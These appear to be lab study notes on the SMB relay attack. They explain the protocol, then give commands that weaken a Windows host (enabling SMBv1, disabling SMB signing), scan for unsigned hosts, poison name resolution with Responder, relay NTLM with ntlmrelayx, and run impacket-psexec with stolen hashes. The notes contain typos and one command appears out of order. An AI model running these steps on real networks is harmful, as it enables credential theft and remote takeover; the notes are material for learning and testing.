### What is SMB?

* **SMB (Server Message Block)** is client-server protocol used for sharing files, printer and other resources on a network.
* **Application** and **presentation layers**. But relies heavily on lower level protocols. 
* SMB is responsible for operations like. 
  * File sharing. 
  * Remote documentation editing.
  * Printer status alerts. (e.g. out of paper) 

---

### SMB Details 

* Uses **TCP port 445**. 
* **DNS** handles address resolution on larger networks. 
* **LLMNR (Local link multicast name resolution)** is used in smaller networks. 
* Typical SMB communication sequence. 
    1. NetBIOS session established. 
    2. Server and client negotiate SMB protocol dialect. 
    3. Client logs on to the server. 
    4. The client connects to a shared resource. 
    5. Client opens a file. 
    6. Client reads/edits the file. 


---

### What is an SMB relay attack? 

* Exploits the NTLM challenge-response authentication. 
* Attaker sits between client and server to relay captured authentication requests to another host.  
* Commonly affect systems where SMB signing is disabled. 
* Attacks work because MTLM does not verify that a server is who it claims to be. 

---

### Enabling SMBv1 feature. 

To use SMBv1 protocol, first enable the feature on your system.

```powershell
powershell.exe -nop -ep bypass 
```

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart
```

* ``-Online`` Specifies that the command applies to the running operating system. 
* ``-FeatureName SMB1Protocol`` That the SMBv1 feature will be enabled.  
*  ``-NoRestart`` Prevents the system from restarting automatically after installation. 
  
**Example**

Use this command when connecting to legacy systems or devices that only support SMBv1. 

---

### Configuring SMBv1 in server settings. 

After installing the SMBv1 feature, configure the server to allow SMBv1 communication. 

```powershell
Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
```

* ``-EnableSMB1Protocol $true`` enables SMBv1 support on the server. 
* ``-Force`` Suppresses confirmation prompts. 

**Example**

Useful if specific applications or services required. SMBv1 to communicate properly. 

---

### Verifying SMBv1 status. 

After enabling SMBvone, verify that the protocol is active. 

```powershell
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
```

* ``Get-SmbServerConfiguration`` Retrieves the current SMB server configuration. 
* ``Select-Object EnableSMB1Protocol`` Filters the output to display only the SMBv1 status. 

**Tip**
Use this to confirm if SMBv1 is properly enabled without listing all SMB settings. 
Do same to enable SMB version 2 and version 3. 

---

### Prerequisite. 

* SMB signing must be disabled on the target system. 
* NTLM authentication must be in use. 
* Local administrator access is required on the target for full exploitation and command execution. 

---

### Scan for vulnerable hosts. How? 

```bash
nmap -Pn --open --script=smb2-security-mode.nse -p 445, <IP> 
```

---

### Attack Steps. 

#### Step 1: Start Responder.  

Backup and edit responder config (if needed)

```bash
cp /usr/share/responder/Responder.conf /usr/share/responder/Responder.conf.bak
```

```bash
vim /usr/share/responder/Responder.conf
```

```bash
responder -I eth0 -dwv
```

#### Step 2. Setup NTLMRelay. 

* Create a file with target IPs. 

```bash
ntlmrelayx.py -t <IP> -smb2support -i
```

```bash
echo <IP> > targets-ip.txt
```

* Run ntlmrelayx with SMB 2 support. 

```bash
ntlmrelayx.py -t <IP> -smb2support -i
```

#### Step 3. Trigger authentication from client.  

* Try to access non existent or bait hosts.

```bash
\\pikachu.pokemon.local
\\raichu.pokemon.local
\\s1.local
\\192.168.2.1
```

---

### Optional : Use ``impacket-psexec`` to execute commands. 

```cmd
impacket-psexec drake@192.168.29.229 -hashes <hash>
```

---


### Windows commands to enable disable SMB signing. 

#### Disable SMB signing. 

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $false
Get-SmbServerConfiguration | Select RequireSecuritySignature
```

#### Unable SMB signing. 

```powershell
Set-SmbServerConfiguration -RequireSecuritySignature $true
Get-SmbServerConfiguration | Select RequireSecuritySignature
```

#### Enable SMB 1/SMB 2 protocols (if needed). 

```powershell
Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol
Set-SmbServerConfiguration -EnableSMB1Protocol $true
Set-SmbServerConfiguration -EnableSMB2Protocol $true
```

